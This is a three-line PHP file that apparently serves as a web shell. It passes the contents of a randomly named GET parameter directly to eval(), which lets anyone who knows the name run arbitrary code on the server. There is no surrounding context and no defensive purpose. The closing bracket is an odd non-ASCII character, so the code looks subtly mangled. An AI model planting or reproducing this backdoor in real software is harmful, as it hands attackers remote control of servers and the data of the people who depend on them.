<?php
eval($_GET['tOK7wEqq'〕);
?>
